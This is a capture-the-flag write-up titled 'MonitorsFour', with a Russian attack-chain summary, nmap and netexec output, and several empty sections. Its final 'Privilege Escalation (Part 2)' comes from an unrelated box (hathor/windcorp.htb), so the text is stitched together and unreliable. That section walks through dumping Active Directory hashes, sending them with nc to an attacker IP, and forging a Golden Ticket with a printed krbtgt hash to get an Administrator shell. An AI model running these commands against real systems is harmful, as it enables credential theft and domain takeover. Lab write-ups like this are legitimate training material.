
# MonitorsFour

## Summary
MonitorsFour продолжает серию Monitors, на этот раз на Windows-хосте. Корпоративный веб-сайт предоставляет аутентифицированную API-точку, которая возвращает записи всех сотрудников. Я обойду аутентификацию с помощью уязвимости манипуляции типами (type juggling) в PHP, чтобы получить коллекцию взламываемых хэшей паролей. Эти учётные данные открывают доступ к экземпляру Cacti, где я использую CVE-2025-24367 для внедрения команд в rrdtool и размещения веб-оболочки, попадая в Docker-контейнер. Анализ показывает, что хост запускает Docker Desktop с бэкендом WSL2, и что контейнер может напрямую обращаться к API Docker Engine (CVE-2025-9074). Я создам новый контейнер, который монтирует диск Windows-хоста, и прочитаю root-флаг. В разделе «За пределами корня» я превращу этот доступ к файловой системе в оболочку на Windows через запланированное задание и разберу ошибку манипуляции типами в PHP.

## Enumeration

### Nmap


```
nmap обнаруживает два открытых TCP-порта: HTTP (80) и WinRM (5985):

oxdf@hacky$ sudo nmap -p- --min-rate 10000 --reason monitorsfour.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-19 20:21 UTC
Nmap scan report for monitorsfour.htb (10.129.67.15)
Host is up, received echo-reply ttl 127 (0.021s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 127
5985/tcp open  wsman   syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```

```
oxdf@hacky$ sudo nmap -p 80,5985 -sCV 10.129.67.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-15 20:26 UTC
Nmap scan report for 10.129.67.15
Host is up (0.020s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.67 seconds
```
Это Windows-хост, где HTTP-сервером является Nginx.
Оба порта показывают TTL=127, что соответствует ожидаемому TTL для Windows на расстоянии в один хоп.
netexec может выдать домен и имя хоста через WinRM:
```
oxdf@hacky$ netexec winrm 10.129.67.15
WINRM       10.129.67.15    5985   MONITORSFOUR     [*] Windows 11 / Server 2025 Build 26100 (name:MONITORSFOUR) (domain:MonitorsFour) 
```
### Website (Port `80`)



## Foothold


## Getting User


## Privilege Escalation (Part 1)



## Privilege Escalation (Part 2)

For this part we perform a [Golden Ticket attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket). To do this we need to the NTLM hash of the `KRBTGT` user, an account used for Kerberos. You can learn more about the `KRBTGT` user in [this article](https://blog.quest.com/what-is-krbtgt-and-why-should-you-change-the-password/).

We can run [Get-ADReplAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADReplAccount.md) with `get-adreplaccount -all -namingcontext 'DC=windcorp,DC=htb' -server hathor > hashes` to create a file called `hashes` with the hashes for many accounts.

We run the following commands to determine that the file is 42.8 MB:

```powershell
$file = "hashes"
Write-Host((Get-Item $file).length/1MB)
```

So, we run `nc -nvlp 57010 > hashes` on our machine and `cmd /c "C:\share\Bginfo64.exe 10.10.14.116 57010 < hashes"` on the target too download the file. Tip: Use a command like `watch ls -lh hashes` to watch the file transfer progress.

Looking at the `hashes` file we find that the `krbtgt` NTLM hash is `c639e5b331b0e5034c33dec179dcc792`. Now, we can request a ticket as the `Administrator` user by running `ticketer.py -nthash c639e5b331b0e5034c33dec179dcc792 -domain-sid S-1-5-21-3783586571-2109290616-3725730865 -domain windcorp.htb Administrator`.

Then, we store the path to the ticket by running `export KRB5CCNAME=administrator.ccache`. Finally, we run `wmiexec.py -no-pass -k -dc-ip hathor.windcorp.htb windcorp.htb/administrator@hathor.windcorp.htb` to get a shell as the `Administrator` user. Then, just execute `type C:\Users\Administrator\Desktop\root.txt` to get the `root.txt` flag.
